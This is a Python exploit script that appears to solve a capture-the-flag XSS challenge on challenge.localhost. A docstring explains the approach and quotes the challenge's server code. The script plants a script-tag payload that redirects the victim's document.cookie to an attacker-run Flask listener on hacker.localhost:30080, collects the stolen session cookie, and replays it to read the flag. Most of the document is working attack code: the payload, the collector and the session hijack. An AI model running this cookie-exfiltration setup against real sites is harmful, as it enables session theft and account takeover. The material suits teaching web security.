import os
import re
import requests
import signal
from flask import Flask, request, session


"""
Theory:
    XSS:
	An attacker injects a script into a trusted target website (in this case challenge.localhost)
	Once the browser navigates to that website, the script is executed and i.e. the users session
	info is leaked and sent to the attackers server, email etc.

	We need to send the session cookie cross site to our own server.
	We then can retrieve the cookie info from our server and use it in another request
	to the info endpoint of the challenge.
	To allow the session to be sent cross site, the respective request to our server must
	be triggered via a navigational event. We therefore use href. The browser then allows us
	to send the document.cookie with the request. This works, since during the initial cookie
	generation the cookie http_only property was set to false. Otherwise we would not be able
	to access the cookie via javascript.

    app.config['SESSION_COOKIE_HTTPONLY'] = False

    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/info":
        session_user_id = int(session.get("user", -1))
        session_user = db.execute("SELECT * FROM users WHERE rowid = ?", (session_user_id,)).fetchone()

        request_user_id = int(request.args.get("user", session_user_id))
        request_user = db.execute("SELECT * FROM users WHERE rowid = ?", (request_user_id,)).fetchone()
        assert request_user, "Invalid `user`"

        info = [request_user["username"]]
        if request_user_id == session_user_id:
            info.append(request_user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    return "Not Found\n", 404
"""


pat0 = re.compile(r".*Now running the web server:\n")
r_pipe1, w_pipe1 = os.pipe()

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)

	os.dup2(w_pipe1, 1)
	os.close(w_pipe1)

	os.execv("/challenge/run", ["/challenge/run"])
	print("Error execv.")
	exit(1)

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)
	os.close(w_pipe1)

	app = Flask(__name__)

	args = [] # we use a list to ensure, the variable values are persisted accross requests

	@app.route("/", methods=["GET", "POST"])
	def store_ses():
		print(request.args.get("session"))
		args.append(request.args.get("session"))
		return f"{args}", 200

	@app.route("/ret", methods=["GET", "POST"])
	def ret_ses():
		print(args)
		return f"{args}"

	app.run("hacker.localhost", 30080, debug=False)

os.close(w_pipe1)

output = os.fdopen(r_pipe1)

while True:
	line = output.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80/visit"
		xss = '<script>window.location.href="http://hacker.localhost:30080/?"%2bdocument.cookie</script>' # we url encode plus, since auto url encode only on top level not for nested url
		data = {"url": f'http://challenge.localhost:80/echo?echo={xss}'}
		r = requests.get(url, params=data)
		url = "http://hacker.localhost:30080/ret"
		r = requests.get(url)
		url = "http://challenge.localhost:80/info"
		cookie={"session": r.text.replace("'", "").replace("[", "").replace("]", "")}
		print(f"cookie={cookie}")
		r = requests.get(url, cookies=cookie)
		print(r.text)
		os.kill(pid, signal.SIGKILL)
